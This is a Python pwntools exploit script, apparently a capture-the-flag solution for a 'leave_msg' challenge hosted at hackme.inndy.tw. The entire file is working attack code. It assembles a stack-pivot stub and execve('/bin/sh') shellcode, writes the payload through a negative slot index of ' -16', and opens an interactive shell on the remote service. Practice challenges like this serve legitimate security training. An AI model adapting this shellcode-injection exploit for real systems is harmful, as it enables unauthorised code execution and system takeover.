#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context(log_level = "debug", os = "linux", arch = "i386", terminal = ["deepin-terminal", "-x", "sh", "-c"])

def debug():
    addr = raw_input("DEBUG: ")
    gdb.attach(io, "b *0x804861D")

if sys.argv[1] == "l":
    io = process("./leave_msg")
else:
    io = remote("hackme.inndy.tw", 7715)

def leaveMsg(message, slot):
    io.sendlineafter("message:\n", message)
    io.sendlineafter("slot?\n", slot)

#  debug()
payload = asm("add esp, 0x36; jmp esp") + "\x00" + asm(shellcraft.execve("/bin/sh"))
leaveMsg(payload, " -16")

io.interactive()
io.close()
